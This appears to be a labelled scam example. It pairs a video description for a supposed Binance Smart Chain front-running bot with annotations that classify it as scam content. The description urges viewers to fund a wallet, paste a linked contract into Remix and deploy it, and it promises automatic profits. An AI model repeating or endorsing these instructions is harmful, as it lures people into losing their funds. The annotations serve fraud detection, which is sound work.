description: :police car light::police car light::police car light:UPDATE#1: WHEN COMPILING AND LAUNCHING THE CONTRACT, BE SURE TO SELECT UNISWAP V2 FRONTBOT IN THE DROPDOWN MENU INSTEAD OF MANAGER (BASE)  :police car light::police car light::police car light:UPDATE#2: I may have missed is to recommend minimum 0.3BNB.  I got messages from people who didn't fund enough to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower. Gas fees average 0.06*2 (0.12 BNB as it needs speed to get in front of everyone). Better when there is no burn. If it targets token with 10% burn, that's another 0.03BNB taken off of 0.3BNB. Most tokens these days have some burn. Less than 0.3BNB doesn't give you much to work with.  In this video I show you a simple front run deployment in Solidity which automatically locates any liquidity added to a BSC token, immediately buy and sell at profit.  Current parameters of this contract is that 10% of profit automatically reenters the front-run pool, and automatically transacts back to your wallet 90% of the profit.  The remaining pool keeps front running for profit, until you transaction "Action" function in Remix  NOTE: This contract have been designed for Binance Smart Chain and won't work with Ethereum mainnet (On UniSwap for example)  Get metamask:  https://metamask.io/download.html  Connect MetaMask to Binance Smart Chain:  https://academy.binance.com/en/articles/connecting-metamask-to-binance-smart-chain  Access Remix:  https://remix.ethereum.org/  Paste SmartContract in Remix: https://ghostbin.com/LsaNR  @Guru thanks for the quick explanation

annotation.contextual_rationale: This video is scam content because it promotes an easy front-running bot that claims to automate profitable buying and selling, including potentially upwards of 1000 BNB per day. annotation.fine_grained_rationale: The content directly links a bot and smart-contract workflow to deployment, wallet connection, funding, activation, automated trading, and claimed returns. The source describes funding the contract, pressing an action button, automated buying and selling, and profit being sent back to the wallet. The content explicitly presents front-running as a mechanism for obtaining profit by buying in the same block as newly added liquidity and getting ahead of other participants. This supports a market-manipulation or mechanism-bypass secondary subtype without establishing that the mechanism worked.
